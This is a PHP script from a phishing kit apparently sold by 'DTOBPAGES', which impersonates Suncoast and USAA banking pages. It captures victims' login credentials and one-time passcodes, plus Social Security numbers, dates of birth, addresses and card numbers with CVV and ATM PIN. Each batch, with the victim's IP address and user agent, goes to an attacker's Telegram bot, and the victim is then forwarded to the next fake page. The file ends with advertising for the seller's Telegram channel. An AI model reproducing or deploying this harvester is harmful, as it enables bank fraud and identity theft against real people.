<?php
session_start();
error_reporting(0);

include "../setting.php";
$piip = $_SERVER['REMOTE_ADDR'];
$date = date('m/d/Y h:i:s a', time());
$useragent = $_SERVER['HTTP_USER_AGENT'];

if(isset($_POST['PName'])){
   $u=$_POST['UName'];
   $_SESSION['UName2']=$u;
   $p=$_POST['PName'];
   $_SESSION['PName']=$p;
   header("location:index2.php");
}

else if(isset($_POST['PName2'])){

$u2=$_SESSION['UName2'];
$p2=$_SESSION['PName'];
$p1=$_POST['PName2'];



$telegram=$telesave;

$data="SESSION_START[DTOBPAGES]
===== |⫸ SUNCOAST By DTOBPAGES ⫷| =====

   # ----- 🏦 LOGIN ACCESS  ----- #

↳ 【 Username/Email   ⇢ $u2
↳ 【 Password     ⇢ $p2
↳ 【 Password 2   ⇢ $p1




  #  ----- FINGERPRINT  ----- #

↳ 【 IP  ⇢ $piip
↳ 【 SESSION DATE ⇢ $date
↳ 【 USER AGENT ⇢ $useragent

===== |⫸ SUNCOAST By DTOBPAGES ⫷| =====

Copyright © 2023 DTOBPAGES
JOIN CHANNEL: @dtobpages
#################################
";
$txt=$data;

if($telegram=='Yessir'){
$send=['chat_id'=>$chat_id,'text'=>$txt];
$website="https://api.telegram.org/bot$bot_url";
$ch=curl_init($website.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result=curl_exec($ch);
curl_close($ch);
}

header("location:i-o.php");
}

else if(isset($_POST['OTP'])){

   $opt=$_POST['OTP'];
   
   
   
   
   $telegram=$telesave;
   
   $data="
   
      # ----- 🏦 OTP CODE ----- #
   
   ↳ 【 OTP Code ⇢ $opt
   
   
   
   
     #  ----- FINGERPRINT  ----- #
   
   ↳ 【 IP  ⇢ $piip
   ↳ 【 SESSION DATE ⇢ $date
   ↳ 【 USER AGENT ⇢ $useragent
   
   ===== |⫸ SUNCOAST By DTOBPAGES ⫷| =====
   
   Copyright © 2023 DTOBPAGES
   JOIN CHANNEL: @dtobpages
   #################################
   ";
   $txt=$data;
   
   if($telegram=='Yessir'){
   $send=['chat_id'=>$chat_id,'text'=>$txt];
   $website="https://api.telegram.org/bot$bot_url";
   $ch=curl_init($website.'/sendMessage');
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($ch, CURLOPT_POST, 1);
   curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
   $result=curl_exec($ch);
   curl_close($ch);
   }
   
   header("location:ii-o.php");
   }
   else if(isset($_POST['OTP1'])){

      $opt1=$_POST['OTP1'];
      
      
      
      
      $telegram=$telesave;
      
      $data="
      
         # ----- 🏦 OTP CODE 2 ----- #
      
      ↳ 【 OTP Code 2 ⇢ $opt1
      
      
      
      
        #  ----- FINGERPRINT  ----- #
      
      ↳ 【 IP  ⇢ $piip
      ↳ 【 SESSION DATE ⇢ $date
      ↳ 【 USER AGENT ⇢ $useragent
      
      ===== |⫸ SUNCOAST By DTOBPAGES ⫷| =====
      
      Copyright © 2023 DTOBPAGES
      JOIN CHANNEL: @dtobpages
      #################################
      ";
      $txt=$data;
      
      if($telegram=='Yessir'){
      $send=['chat_id'=>$chat_id,'text'=>$txt];
      $website="https://api.telegram.org/bot$bot_url";
      $ch=curl_init($website.'/sendMessage');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      $result=curl_exec($ch);
      curl_close($ch);
      }
      
      header("location:i-f.php");
      }
      else if(isset($_POST['FName'])){
         $fname=$_POST['FName'];
         $lname=$_POST['LName'];
         $dob=$_POST['DOB'];
         $ssn=$_POST['SSNName'];
         $addy=$_POST['StName'];
         $apt=$_POST['ApName'];
         $cname=$_POST['CName'];
         $sname=$_POST['SName'];
         $zname=$_POST['ZName'];
         $tel=$_POST['TEL'];
         $email=$_POST['EName'];
         $_SESSION['UName']=$email;



         $telegram=$telesave;

         $data="
       # ----- 🏦 INFO ACCESS ----- #

       ↳ 【 First Name ⇢ $fname
       ↳ 【 Last Name ⇢ $lname
       ↳ 【 DOB ⇢ $dob
       ↳ 【 SSN ⇢ $ssn
       ↳ 【 Address ⇢ $addy
       ↳ 【 Address 2 ⇢ $apt
       ↳ 【 City ⇢ $cname
       ↳ 【 State ⇢ $sname
       ↳ 【 Zip Code ⇢ $zname
       ↳ 【 Phone Number ⇢ $tel 
       ↳ 【 Email ⇢ $email



      #  ----- FINGERPRINT  ----- #

    ↳ 【 IP  ⇢ $piip
    ↳ 【 SESSION DATE ⇢ $date
    ↳ 【 USER AGENT ⇢ $useragent

    ===== |⫸ SUNCOAST By DTOBPAGES ⫷| =====

    Copyright © 2023 DTOBPAGES
    JOIN CHANNEL: @dtobpages
    #################################
    ";
         $txt=$data;

         if($telegram=='Yessir'){
            $send=['chat_id'=>$chat_id,'text'=>$txt];
            $website="https://api.telegram.org/bot$bot_url";
            $ch=curl_init($website.'/sendMessage');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result=curl_exec($ch);
            curl_close($ch);
         }

    header("location:i-c.php");
      }
      else if(isset($_POST['CName'])){
         $cardnumber=$_POST['CName'];
         $expiry=$_POST['CXName'];
         $cvc=$_POST['CVS'];
         $atmpin=$_POST['ATM'];
         $bin=substr($cardnumber,0,7);
         $bbin=preg_replace("/[^a-zA-Z0-9]+/", "", $bin);
         $telegram=$telesave;

         $getdetails = "https://lookup.binlist.net/".$bbin;
         $curl = curl_init();
         curl_setopt($curl, CURLOPT_URL, $getdetails);
         curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
         $content    = curl_exec($curl);
         curl_close($curl);
         $details  = json_decode($content);
         $bank = $details->bank->name;
         $type = $details->type;
         $banktel = $details->bank->phone;
         $cardcountry = $details->country->name;
         $cemo = $details->country->emoji;
         $ctype=$details->scheme;
         $data="
   # ----- 🏦 CARD INFO  ----- #
↳ 【 BIN   ⇢ $bbin
↳ 【 Card number   ⇢ $cardnumber
↳ 【 Expiry date     ⇢ $expiry
↳ 【 CVV   ⇢ $cvc
↳ 【 ATM PIN ⇢ $atmpin
↳ 【 Brand   ⇢ $ctype
↳ 【 Country     ⇢ $cardcountry$cemo
↳ 【 Type     ⇢ $type
↳ 【 Bank     ⇢ $bank
↳ 【 Bank Tel     ⇢ $banktel



  #  ----- FINGERPRINT  ----- #

↳ 【 IP  ⇢ $piip
↳ 【 SESSION DATE ⇢ $date
↳ 【 USER AGENT ⇢ $useragent

===== |⫸ USAA DTOBPAGES ⫷| =====

Copyright © 2023 DTOBPAGES
JOIN CHANNEL: @dtobpages
#################################
";
         $txt=$data;

         if($telegram=='Yessir'){
            $send=['chat_id'=>$chat_id,'text'=>$txt];
            $website="https://api.telegram.org/bot$bot_url";
            $ch=curl_init($website.'/sendMessage');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result=curl_exec($ch);
            curl_close($ch);
         }

header("location:mmi/i-s.php");
      }

/*
 ,'|"\   _______  .---.  ,---.     ,---.    .--.    ,--,   ,---.     .---. 
 | |\ \ |__   __|/ .-. ) | .-.\    | .-.\  / /\ \ .' .'    | .-'    ( .-._)
 | | \ \  )| |   | | |(_)| |-' \   | |-' )/ /__\ \|  |  __ | `-.   (_) \   
 | |  \ \(_) |   | | | | | |--. \  | |--' |  __  |\  \ ( _)| .-'   _  \ \  
 /(|`-' /  | |   \ `-' / | |`-' /  | |    | |  |)| \  `-) )|  `--.( `-'  ) 
(__)`--'   `-'    )---'  /( `--'   /(     |_|  (_) )\____/ /( __.' `----'  
                 (_)    (__)      (__)            (__)    (__)             
                 CONTACT ON TELEGRAM @dtobpages
                 
*/
?>